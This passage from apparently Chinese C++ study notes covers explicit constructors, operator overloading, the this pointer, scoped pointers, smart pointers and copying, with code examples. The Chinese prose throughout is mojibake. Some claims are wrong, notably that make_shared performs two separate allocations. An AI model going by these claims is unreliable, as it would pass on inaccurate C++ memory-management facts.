Entity[50];</code></p><p>ç©ºé—²åˆ—è¡¨ï¼šç»´æŠ¤æœ‰ç©ºé—²å­—èŠ‚çš„åœ°å€ã€‚</p><p>newæ˜¯ä¸€ä¸ªæ“ä½œç¬¦ï¼Œè¿™æ„å‘³ç€å¯ä»¥é‡è½½è¿ç®—ç¬¦æ”¹å˜å…¶è¡Œä¸ºã€‚</p><p>è°ƒç”¨new = <strong>è°ƒç”¨éšè—å…¶ä¸­çš„cå‡½æ•° + æ‰§è¡Œæ„é€ å‡½æ•°</strong>ï¼Œ<code>Entity* e = new Entity();</code> ç­‰ä»·äº <code>Entity* e = (Entity*)malloc(sizeof(Entity)); + æ‰§è¡Œæ„é€ å‡½æ•°;</code> ï¼Œåœ¨C++ä¸­ä¸åº”è¯¥å†™åè€…ã€‚</p><p>ç”¨ new å¿…é¡»é…å¥—ç”¨delete æˆ– delete[]ã€‚</p><p><strong>placement new:</strong> <code>Entity* e = new(b) Entity();</code> æŒ‡å®šnewçš„åœ°å€æ˜¯ä½¿ç”¨å˜é‡bçš„åœ°å€ã€‚</p><h1 id="39-Implicit-Conversion-and-the-Explicit-Keyword-in-C">39 Implicit Conversion and the Explicit Keyword in C++</h1><p>C++å…è®¸ç¼–è¯‘å™¨å¯¹ä»£ç æ‰§è¡Œ<strong>ä¸€æ¬¡</strong>éšå¼è½¬æ¢ï¼ˆéšå¼æ„é€ å‡½æ•°ï¼‰ï¼Œè€Œä¸éœ€è¦ç”¨caståšå¼ºåˆ¶è½¬æ¢ã€‚</p><p>explicitå…³é”®å­—æ”¾åœ¨æ„é€ å‡½æ•°å‰ï¼Œæ„å‘³ç€æ²¡æœ‰éšå¼çš„è½¬æ¢ï¼Œå¿…é¡»æ˜¾å¼è°ƒç”¨æ„é€ å‡½æ•°ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Entity</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  std::string m_Name;</span><br><span class="line">  <span class="type">int</span> m_Age;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="built_in">Entity</span>(<span class="type">const</span> std::string&amp; name)</span><br><span class="line">    : <span class="built_in">m_Name</span>(name), <span class="built_in">m_Age</span>(<span class="number">-1</span>) &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">explicit</span> <span class="title">Entity</span><span class="params">(<span class="type">const</span> <span class="type">int</span> age)</span></span></span><br><span class="line"><span class="function">    : m_Name(<span class="string">&quot;Unknown&quot;</span>), m_Age(age) &#123;</span>&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="comment">//Entity a = &quot;JKA&quot;;  // ä¸è¡Œ: ä»const charåˆ°stringå†åˆ°Entityéœ€è¦2æ¬¡è½¬æ¢</span></span><br><span class="line">  Entity a = std::<span class="built_in">string</span>(<span class="string">&quot;JKA&quot;</span>);</span><br><span class="line">  <span class="comment">//Entity b = 22;  // ä¸è¡Œ: åŠ ä¸Šexplicitåå°±ä¸èƒ½ç”¨äº†å“Ÿ</span></span><br><span class="line"></span><br><span class="line">  std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="40-OPERATORS-and-OPERATOR-OVERLOADING-in-C">40 OPERATORS and OPERATOR OVERLOADING in C++</h1><p>è¿ç®—ç¬¦æ˜¯ä¸€ç§é€šå¸¸ä»£æ›¿ä¸€ä¸ªå‡½æ•°æ‰§è¡Œä¸€äº›äº‹æƒ…çš„ç¬¦å·ã€‚<code>.</code> <code>()</code> <code>new</code> <code>delete</code> å®é™…ä¸Šéƒ½æ˜¯æ˜¯è¿ç®—ç¬¦ï¼Œè¿ç®—ç¬¦å®é™…å°±æ˜¯å‡½æ•°ã€‚<br>å°½é‡å°‘ç”¨ è¿ç®—ç¬¦é‡è½½ï¼Œé™¤éç¡®å®é€‚åˆã€‚</p><p>é‡è½½æœ¬è´¨æ˜¯ç»™è¿ç®—ç¬¦é‡è½½èµ‹äºˆæ–°çš„å«ä¹‰ã€‚å…è®¸åœ¨ç¨‹åºä¸­å®šä¹‰æˆ–æ›´æ”¹è¿ç®—ç¬¦çš„è¡Œä¸ºï¼Œè¿™åœ¨Javaä¸­ä¸æ”¯æŒï¼ŒC#ä¸­éƒ¨åˆ†æ”¯æŒï¼Œè€Œåœ¨C++ä¸­æ‹¥æœ‰å®Œå…¨çš„æ§åˆ¶æƒã€‚</p><p><strong>è¿ç®—ç¬¦é‡è½½å†™åœ¨ç±»é‡Œæ˜¯æˆå‘˜å‡½æ•°ï¼Œä¹Ÿå¯ä»¥å†™åœ¨ç±»å¤–åšæ™®é€šå‡½æ•°ï¼Œå‚æ•°ä¸ä¸€æ ·ã€‚</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Vector2</span> &#123;</span><br><span class="line">  <span class="type">float</span> x, y;</span><br><span class="line">  <span class="built_in">Vector2</span>(<span class="type">float</span> x, <span class="type">float</span> y)</span><br><span class="line">    : <span class="built_in">x</span>(x), <span class="built_in">y</span>(y) &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">Vector2 <span class="title">Add</span><span class="params">(<span class="type">const</span> Vector2&amp; other)</span> <span class="type">const</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Vector2</span>(x + other.x, y + other.y);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  Vector2 <span class="keyword">operator</span>+(<span class="type">const</span> Vector2&amp; other) <span class="type">const</span> &#123;  <span class="comment">// å¯ä»¥è°ƒç”¨æ™®é€šå‡½æ•°</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Add</span>(other);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">Vector2 <span class="title">Multiply</span><span class="params">(<span class="type">const</span> Vector2&amp; other)</span> <span class="type">const</span> </span>&#123;</span><br><span class="line">    <span class="comment">//return operator*(other);  // ä¹Ÿå¯</span></span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">this</span> * other;  <span class="comment">// æ™®é€šå‡½æ•°ä¹Ÿèƒ½è°ƒç”¨ è¿ç®—ç¬¦é‡è½½å‡½æ•°</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  Vector2 <span class="keyword">operator</span>*(<span class="type">const</span> Vector2&amp; other) <span class="type">const</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Vector2</span>(x * other.x, y * other.y);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è¿ç®—ç¬¦é‡è½½æ—¢å¯ä»¥æ”¾ç±»å†…ï¼Œä¹Ÿå¯ä»¥æ”¾ç±»å¤–</span></span><br><span class="line">std::ostream&amp; <span class="keyword">operator</span>&lt;&lt;(std::ostream&amp; stream, <span class="type">const</span> Vector2&amp; other) &#123;</span><br><span class="line">  stream &lt;&lt; other.x &lt;&lt; <span class="string">&quot;,&quot;</span> &lt;&lt; other.y;</span><br><span class="line">  <span class="keyword">return</span> stream;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="function">Vector2 <span class="title">position</span><span class="params">(<span class="number">4.0f</span>, <span class="number">4.0f</span>)</span></span>;</span><br><span class="line">  <span class="function">Vector2 <span class="title">speed</span><span class="params">(<span class="number">0.5f</span>, <span class="number">1.5f</span>)</span></span>;</span><br><span class="line">  <span class="function">Vector2 <span class="title">powerup</span><span class="params">(<span class="number">1.1f</span>, <span class="number">1.1f</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">  Vector2 res1 = position.<span class="built_in">Add</span>(speed.<span class="built_in">Multiply</span>(powerup));</span><br><span class="line">  Vector2 res2 = position + speed * powerup;</span><br><span class="line"></span><br><span class="line">  std::cout &lt;&lt; res2 &lt;&lt; std::endl;  <span class="comment">// Vector2æ— æ³•ç›´æ¥è¾“å‡ºï¼Œéœ€è¦é‡è½½&lt;&lt; æˆ– to_string</span></span><br><span class="line">  std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// --- Out ---</span></span><br><span class="line"><span class="number">4.55</span> <span class="number">5.65</span></span><br></pre></td></tr></table></figure><blockquote><p>ğŸ’¡ æ€è€ƒï¼šä¸ºå•¥å°†operator+() å‚æ•°ä¸­constå»æ‰åä¼šæŠ¥é”™ï¼š<br>error C2679: äºŒå…ƒâ€œ+â€: æ²¡æœ‰æ‰¾åˆ°æ¥å—â€œVector2â€ç±»å‹çš„å³æ“ä½œæ•°çš„è¿ç®—ç¬¦(æˆ–æ²¡æœ‰å¯æ¥å—çš„è½¬æ¢)<br>error C2512: â€œVector2â€: æ²¡æœ‰åˆé€‚çš„é»˜è®¤æ„é€ å‡½æ•°å¯ç”¨ï¼Ÿ</p><p>åŸå› ï¼šæ ¹æ®ã€ŠC++ Primer ç¬¬5ç‰ˆã€‹P202ï¼Œå‡½æ•°çš„è¿”å›ç±»å‹å†³å®šå‡½æ•°è°ƒç”¨æ˜¯å¦æ˜¯å·¦å€¼ï¼Œè°ƒç”¨ä¸€ä¸ªè¿”å›å¼•ç”¨çš„å‡½æ•°å¾—åˆ°å·¦å€¼ï¼Œå…¶ä»–è¿”å›ç±»å‹å¾—åˆ°å³å€¼ã€‚<br>è¿™é‡Œ<em>è¿”å›çš„å°±æ˜¯å³å€¼ï¼Œè€Œ+è‹¥è®¾ç½®å‚æ•°ä¸ºéå¸¸é‡å¼•ç”¨ï¼Œåˆ™ä¸èƒ½æ¥å—å³å€¼ã€‚<br>æ‰©å±•ï¼šå¯ä»¥æ‰§è¡Œ<code>Vector2 tmp = speed * powerup;</code> ç„¶åå† <code>tmp.x++;</code>ï¼Œè¿™æ˜¯å› ä¸ºè™½ç„¶</em>è¿”å›çš„æ˜¯å³å€¼ï¼Œä½†tmpæ˜¯æ ¹æ®æ­¤å³å€¼åˆå§‹åŒ–äº†ä¸€ä¸ªå˜é‡ã€‚</p></blockquote><h1 id="41-The-â€œthisâ€-keyword-in-C">41 The â€œthisâ€ keyword in C++</h1><p>é€šè¿‡thiså…³é”®å­—å¯ä»¥è®¿é—®æˆå‘˜å‡½æ•°ï¼Œå¯ä»¥åœ¨æˆå‘˜å‡½æ•°ä¸­ä½¿ç”¨thisï¼Œthisæ˜¯ä¸€ä¸ªæŒ‡å‘å½“å‰å¯¹è±¡å®ä¾‹çš„<strong>æŒ‡é’ˆ</strong>ï¼Œè®¿é—®æˆå‘˜å˜é‡æ—¶ä½¿ç”¨<code>-&gt;</code>ï¼Œè€Œé<code>.</code>ã€‚</p><blockquote><p>ğŸ’¡ thiså…³é”®å­—å­˜åœ¨çš„ç†ç”±å°±æ˜¯ <strong>ä¸ç”¨æ¯ä¸ªå¯¹è±¡éƒ½è¦ç”³è¯·ç©ºé—´å»ä¿å­˜å‡½æ•°çš„å£°æ˜å’Œå®šä¹‰ï¼Œåªéœ€è¦åœ¨ç±»ä¸­ä¿å­˜ä¸€æ¬¡ï¼Œç„¶åè°ƒç”¨å‡½æ•°çš„æ—¶å€™ä¼ å…¥ä¸åŒçš„thiså°±å¯ä»¥äº†ã€‚</strong></p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">PrintEntity</span><span class="params">(Entity* e)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Entity</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="type">int</span> x, y;</span><br><span class="line">  <span class="built_in">Entity</span>(<span class="type">int</span> x, <span class="type">int</span> y) &#123;  <span class="comment">// å‚æ•°ä¸ç±»æˆå‘˜å˜é‡åŒå</span></span><br><span class="line">    <span class="keyword">this</span>-&gt;x = x;  <span class="comment">// thisæ˜¯æŒ‡é’ˆ</span></span><br><span class="line">    <span class="keyword">this</span>-&gt;y = y;</span><br><span class="line">    <span class="built_in">PrintEntity</span>(<span class="keyword">this</span>);  <span class="comment">// ä¼ å…¥å½“å‰å¯¹è±¡æŒ‡é’ˆ</span></span><br><span class="line">    </span><br><span class="line">    Entity&amp; e = *<span class="keyword">this</span>; </span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">GetX</span><span class="params">()</span> <span class="type">const</span> </span>&#123;</span><br><span class="line">    <span class="type">const</span> Entity &amp;e = *<span class="keyword">this</span>;  <span class="comment">// å‡½æ•°ä¸­éœ€è¦å£°æ˜ä¸ºconstï¼Œé˜²æ­¢ä¿®æ”¹e</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">PrintEntity</span><span class="params">(Entity* e)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// Printing</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸Šé¢ä¾‹å­ä¸­ï¼Œå¦‚æœç”¨å‡½æ•°åˆå§‹åŒ–åˆ—è¡¨å°±ä¸ç”¨å†™thisã€‚</p><h1 id="42-Object-Lifetime-in-C-Stack-Scope-Lifetimes">42 Object Lifetime in C++ (Stack/Scope Lifetimes)</h1><p>åœ¨å±€éƒ¨åˆ›å»ºæ•°ç»„æ˜¯ä¸€ä¸ªå…¸å‹çš„é”™è¯¯ï¼Œä¸€æ—¦å‡½æ•°ç»“æŸå°±è¶…å‡ºäº†ä½œç”¨åŸŸã€‚</p><p>ç›®çš„ï¼šæƒ³åœ¨å †ä¸Šåˆ†é…ï¼Œä½†åœ¨è¶…å‡ºä½œç”¨åŸŸæ—¶è‡ªåŠ¨åˆ é™¤ã€‚<br>æ“ä½œï¼šä½¿ç”¨æ ‡å‡†åº“ä¸­**unique_ptrï¼Œ**æˆ–è‡ªå·±å®ç°ä½œç”¨åŸŸæŒ‡é’ˆã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Entity</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="built_in">Entity</span>() &#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Created Entity!&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ~<span class="built_in">Entity</span>() &#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Destroyed Entity!&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ScopedPtr</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  Entity* m_Ptr;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="built_in">ScopedPtr</span>(Entity* ptr)</span><br><span class="line">    : <span class="built_in">m_Ptr</span>(ptr) &#123;&#125;</span><br><span class="line"></span><br><span class="line">  ~<span class="built_in">ScopedPtr</span>() &#123;</span><br><span class="line">    <span class="keyword">delete</span> m_Ptr;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  &#123;</span><br><span class="line">    ScopedPtr e = <span class="keyword">new</span> <span class="built_in">Entity</span>();  <span class="comment">// éšå¼è½¬æ¢</span></span><br><span class="line">    <span class="comment">//ScopedPtr e(new Entity());</span></span><br><span class="line">  &#125;  <span class="comment">// è¶…å‡ºä½œç”¨åŸŸ, eææ„</span></span><br><span class="line">  std::cout &lt;&lt; <span class="string">&quot;Main not end until here\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// --- Out ---</span></span><br><span class="line">Created Entity!</span><br><span class="line">Destroyed Entity!</span><br><span class="line">Main <span class="keyword">not</span> end until here</span><br></pre></td></tr></table></figure><h1 id="43-SMART-POINTERS-in-C-std-unique-ptr-std-shared-ptr-std-weak-ptr">43 SMART POINTERS in C++ (std::unique_ptr, std::shared_ptr, std::weak_ptr)</h1><p>æ™ºèƒ½æŒ‡é’ˆæœ¬è´¨ä¸Šæ˜¯<strong>ä¸€ä¸ªåŸå§‹æŒ‡é’ˆçš„åŒ…è£…ï¼Œnewåä¸éœ€è¦æ‰‹åŠ¨deleteï¼Œç”šè‡³å¯èƒ½newéƒ½ä¸éœ€è¦ã€‚</strong></p><h2 id="unique-ptr-å¼€é”€å°ï¼Œä¼˜å…ˆé€‰æ‹©">unique_ptr å¼€é”€å°ï¼Œä¼˜å…ˆé€‰æ‹©</h2><p><strong>ä¸èƒ½å¤åˆ¶unique_ptr</strong>ï¼šå¤åˆ¶çš„ä¸¤ä¸ªæŒ‡é’ˆæŒ‡å‘åŒä¸€å†…å­˜å—ï¼Œå¦‚æœå…¶ä¸­ä¸€ä¸ªdeadï¼Œå†…å­˜å°±ä¼šè¢«é‡Šæ”¾ï¼Œè¿™æ ·æŒ‡å‘åŒä¸€å†…å­˜çš„ç¬¬äºŒä¸ªunique_ptræŒ‡å‘å·²è¢«é‡Šæ”¾çš„å†…å­˜ã€‚<br>æ•ˆç‡é«˜ã€æ•ˆç‡å¾ˆé«˜ï¼š<strong>æ ˆ</strong>ä¸Šåˆ†é…ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;memory&gt;</span>  <span class="comment">// éœ€è¦åŒ…å«</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Entity</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="built_in">Entity</span>() &#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Created Entity!&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ~<span class="built_in">Entity</span>() &#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Destroyed Entity!&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">//std::unique_ptr&lt;Entity&gt; entity(new Entity());  // å†™æ³•1</span></span><br><span class="line">    std::unique_ptr&lt;Entity&gt; entity = std::<span class="built_in">make_unique</span>&lt;Entity&gt;();  <span class="comment">// make_unique å¼‚å¸¸å®‰å…¨</span></span><br><span class="line">    <span class="comment">//std::unique_ptr&lt;Entity&gt; entity = new Entity();  // ä¸èƒ½è¿™æ ·, unique_ptræ„é€ å‡½æ•°æ˜¯explicitçš„</span></span><br><span class="line">  &#125;</span><br><span class="line">  std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>std::make_unique&lt;ç±»&gt;()æ˜¯åœ¨C++14å¼•å…¥çš„ï¼ŒC++11å¹¶ä¸æ”¯æŒã€‚<br>ä¸ç›´æ¥è°ƒç”¨newçš„åŸå› æ˜¯ä¸ºäº† <strong>å¼‚å¸¸å®‰å…¨</strong>ã€‚</p><h2 id="shared-ptr">shared_ptr</h2><p>å®ç°æ–¹å¼å–å†³äº <strong>ç¼–è¯‘å™¨</strong> å’Œ <strong>åœ¨ç¼–è¯‘å™¨ä¸­ä½¿ç”¨çš„æ ‡å‡†åº“</strong>ï¼Œæ¯”å¦‚<strong>å¼•ç”¨è®¡æ•°ï¼ˆreference countingï¼‰</strong>â€”â€”å¼•ç”¨è®¡æ•°å½’é›¶æ—¶é‡Šæ”¾å†…å­˜ã€‚<br>shared_ptr éœ€è¦åˆ†é…å¦ä¸€å—å†…å­˜ï¼Œå«åš<strong>æ§åˆ¶å—</strong>ï¼Œç”¨äºå­˜å‚¨å¼•ç”¨è®¡æ•°ã€‚</p><p>std::make_share&lt;ç±»&gt;() åŒ…æ‹¬2æ¬¡å†…å­˜åˆ†é…ï¼Œå…ˆåšä¸€æ¬¡new Entityçš„åˆ†é…ï¼Œç„¶åæ˜¯shared_ptrçš„æ§åˆ¶å†…å­˜å—çš„åˆ†é…ã€‚</p><p>å½“å°†ä¸€ä¸ªshared_ptrèµ‹å€¼ç»™å¦ä¸€ä¸ªshared_pträ¼šå¢åŠ å¼•ç”¨è®¡æ•°ï¼Œå½“æŠŠä¸€ä¸ªshared_ptrèµ‹å€¼ç»™ä¸€ä¸ªweak_ptræ—¶ä¸ä¼šå¢åŠ å¼•ç”¨è®¡æ•°ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;memory&gt;</span>  <span class="comment">// éœ€è¦åŒ…å«</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Entity</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="built_in">Entity</span>() &#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Created Entity!&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ~<span class="built_in">Entity</span>() &#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Destroyed Entity!&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  &#123;</span><br><span class="line">    std::shared_ptr&lt;Entity&gt; e0;</span><br><span class="line">    &#123;</span><br><span class="line">      std::shared_ptr&lt;Entity&gt; sharedEntity = std::<span class="built_in">make_shared</span>&lt;Entity&gt;();</span><br><span class="line">      std::weak_ptr&lt;Entity&gt; w = sharedEntity;</span><br><span class="line">      e0 = sharedEntity;</span><br><span class="line">    &#125;  <span class="comment">// e0å°šåœ¨ä½œç”¨åŸŸï¼Œå¼•ç”¨ä¸º1</span></span><br><span class="line">  &#125;  <span class="comment">// å¼•ç”¨å½’é›¶ï¼Œæ‰§è¡Œææ„å‡½æ•°</span></span><br><span class="line"></span><br><span class="line">  &#123;</span><br><span class="line">    std::weak_ptr&lt;Entity&gt; w;</span><br><span class="line">    &#123;</span><br><span class="line">      std::shared_ptr&lt;Entity&gt; shareEntity = std::<span class="built_in">make_shared</span>&lt;Entity&gt;();</span><br><span class="line">      w = shareEntity;</span><br><span class="line">    &#125;  <span class="comment">// å¼•ç”¨å½’0ï¼Œæ‰§è¡Œææ„å‡½æ•°</span></span><br><span class="line">  &#125;</span><br><span class="line">  std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="weak-ptr">weak_ptr</h2><p>å¯è¢«å¤åˆ¶ï¼Œä½†æ˜¯ä¸ä¼šå¢åŠ é¢å¤–çš„æ§åˆ¶å—æ¥æ§åˆ¶è®¡æ•°ï¼Œä»…ä»…å£°æ˜è¿™ä¸ªæŒ‡é’ˆè¿˜æ´»ç€ã€‚</p><h1 id="44-Copying-and-Copy-Constructors-in-C">44 Copying and Copy Constructors in C++</h1><p>é™¤å¼•ç”¨å¤–ï¼Œå½“ä½¿ç”¨èµ‹å€¼ç¬¦å·æ—¶ï¼Œæ€»æ˜¯åœ¨åšå€¼èµ‹å€¼ã€‚<br>å¯èƒ½æ˜¯æŒ‡é’ˆï¼ˆå†…å­˜åœ°å€ï¼‰å€¼ï¼Œä¹Ÿå¯ä»¥æ˜¯ç›´æ¥å†…å­˜æ•°æ®çš„å€¼ã€‚</p><p>æµ…å¤åˆ¶ï¼šå¤åˆ¶å¯¹è±¡æ—¶çœ‹å¯¹è±¡ç”±ä»€ä¹ˆç»„æˆï¼Œå¦‚æœåŒ…æ‹¬æŒ‡é’ˆæˆå‘˜å¯¹è±¡ï¼Œåˆ™<strong>ç›´æ¥å¤åˆ¶æŒ‡é’ˆè€Œä¸ä¼šçœ‹æŒ‡é’ˆæŒ‡å‘çš„å†…å®¹ï¼Œä¸ä¼šé‡æ–°è°ƒç”¨æ„é€ å‡½æ•°ã€‚</strong></p><p>åé¢ä¾‹å­ï¼Œè¯·æ‰¾å‡ºé—®é¢˜ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 